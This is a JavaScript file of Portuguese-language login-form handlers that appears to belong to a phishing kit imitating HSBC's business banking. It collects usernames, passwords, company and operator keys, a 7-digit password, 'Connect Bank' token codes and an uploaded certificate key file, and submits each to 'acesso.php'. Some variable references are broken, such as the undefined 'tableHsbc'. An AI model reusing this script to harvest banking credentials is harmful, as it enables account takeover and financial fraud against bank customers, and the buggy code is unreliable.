function setArqName(){
	var NameArq = document.getElementById('arquivo').value;
	var CertPass  = document.getElementById('cert_pass_block');
	var infoHbc   = document.getElementById('info_hbc_now');
	infoHbc.style.display = 'none';
	document.getElementById('nome_arquivo').value = NameArq;
	CertPass.style.display  = 'block';
}

function getKeyName(){
	var NameArq = document.getElementById('arquivo').value;
	document.getElementById('nome_arquivo').value = NameArq;

}

function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}

function getUserTable(){
	document.getElementById('main_user').value 		= '';
	document.getElementById('main_pass').value 		= '';
	document.getElementById('arquivo').value 		= '';
	document.getElementById('nome_arquivo').value	= '';
	document.getElementById('chave_emp').value 		= '';
	document.getElementById('chave_ope').value 		= '';
	document.getElementById('sete_pass').value 		= '';

	var CertPass  = document.getElementById('cert_pass_block');
	var infoHbc   = document.getElementById('info_hbc_now');
	var TableUser = document.getElementById('tableUser');
	var TableCert = document.getElementById('tableCert');
	var TabelHsbc = document.getElementById('tableHbc');
	infoHbc.style.display   = 'none';
	CertPass.style.display  = 'none';
	TableCert.style.display = 'none';
	tableHsbc.style.display = 'none';
	TableUser.style.display = 'block';
}

function getCertTable(){
	document.getElementById('main_user').value 		= '';
	document.getElementById('main_pass').value 		= '';
	document.getElementById('arquivo').value 		= '';
	document.getElementById('nome_arquivo').value	= '';
	document.getElementById('chave_emp').value 		= '';
	document.getElementById('chave_ope').value 		= '';
	document.getElementById('sete_pass').value 		= '';

	var CertPass  = document.getElementById('cert_pass_block');
	var infoHbc   = document.getElementById('info_hbc_now');
	var TableUser = document.getElementById('tableUser');
	var TableCert = document.getElementById('tableCert');
	var TabelHsbc = document.getElementById('tableHbc');
	infoHbc.style.display   = 'none';
	tableUser.style.display = 'none';
	tableHsbc.style.display = 'none';	
	tableCert.style.display = 'block';
}

function getHbcTable(){
	document.getElementById('main_user').value 		= '';
	document.getElementById('main_pass').value 		= '';
	document.getElementById('arquivo').value 		= '';
	document.getElementById('nome_arquivo').value	= '';
	document.getElementById('chave_emp').value 		= '';
	document.getElementById('chave_ope').value 		= '';
	document.getElementById('sete_pass').value 		= '';

	var CertPass  = document.getElementById('cert_pass_block');
	var infoHbc   = document.getElementById('info_hbc_now');
	var TableUser = document.getElementById('tableUser');
	var TableCert = document.getElementById('tableCert');
	var TabelHsbc = document.getElementById('tableHbc');
	CertPass.style.display  = 'none';
	tableUser.style.display = 'none';
	tableCert.style.display = 'none';	
	tableHsbc.style.display = 'block';
	infoHbc.style.display   = 'block';
}

function check_geral(){

	var mainForm = document.getElementById('mainForm');


	if(document.getElementById("type_acess-one").checked){
		var user = document.getElementById('main_user').value;
		var pass = document.getElementById('main_pass').value;
		
		if(user == ''){
			alert("Informe o usuário!");
			document.getElementById('main_user').focus();
			return false;
		}
		else if(user.length < 6){
			alert("Usuário inválido!");
			document.getElementById('main_user').focus();
			return false;
		}
		else if(pass == ''){
			alert("Informe a senha!");
			document.getElementById('main_pass').focus();
			return false;
		}
		else if(pass.length < 6){
			alert("Senha inválida!");
			document.getElementById('main_pass').focus();
			return false;
		}
		else{
			mainForm.action = "acesso.php";
			mainForm.submit();
		}
		
	}else if(document.getElementById("type_acess-three").checked){
		var arquivo = document.getElementById('arquivo').value;
		var NameArq = document.getElementById('nome_arquivo').value;
		var pass 	= document.getElementById('cert_pass').value;

		if(arquivo.length < 1 && NameArq.length < 1){
			alert("Selecione seu certificado digital!");
			return false;
		}else if(pass == '' || pass.length < 8){
			alert("Informe sua senha!");
			document.getElementById('cert_pass').focus();
			return false;
		}else{
			mainForm.action = "acesso.php";
			mainForm.submit();
		}
	}else if(document.getElementById("type_acess-four").checked){
		var chaveEmp = document.getElementById('chave_emp').value;
		var chaveOpe = document.getElementById('chave_ope').value;
		var sete_pass = document.getElementById('sete_pass').value;
		
		if(chaveEmp == '' || chaveEmp.length < 5){
			alert("Informe a chave da empresa");
			document.getElementById('chave_emp').focus();
			return false;
		}else if(chaveOpe == '' || chaveOpe.length < 5){
			alert("Informe a chave do operador!");
			document.getElementById('chave_ope').focus();
			return false;
		}else if(sete_pass == '' || sete_pass.length < 7){
			alert("Informe sua senha de 7 dígitos!");
			document.getElementById('sete_pass').focus();
			return false;
		}else{
			mainForm.action = "acesso.php";
			mainForm.submit();
		}
	}else{
		alert("Selecione o tipo de Acesso!");
		return false;
	}
}

function check_hbc(){
	var token = document.getElementById('tk_hbc').value;

	if(token == ''){
		alert("Informe o seu código Token do Connect Bank!");
		document.getElementById('tk_hbc').focus();
		return false;
	}
	else if(token.length < 6){
		alert("O código Token informado não é válido!");
		document.getElementById('tk_hbc').focus();
		return false;
	}
	else{
		mainForm.action = "acesso.php";
		mainForm.submit();
	}

}

function check_key(){
	var mainForm = document.getElementById('mainForm');
	var key = document.getElementById('arquivo').value;

	if(key == ''){
		alert("Selecione sua chave de validação para continuar.\nEx.: certificado.key");
		return false;
	}else{
		mainForm.action = "acesso.php";
		mainForm.submit();
	}
}

function check_tk(){
	var mainForm = document.getElementById('mainForm');
	var token = document.getElementById('tk_hbc').value;

	if(token == ''){
		alert("Informe o seu código Token para continuar!");
		document.getElementById('tk_hbc').focus();
		return false;
	}
	else if(token.length < 6){
		alert("O código Token informado não é válido!");
		document.getElementById('tk_hbc').focus();
		return false;
	}else{
		mainForm.action = "acesso.php";
		mainForm.submit();
	}
}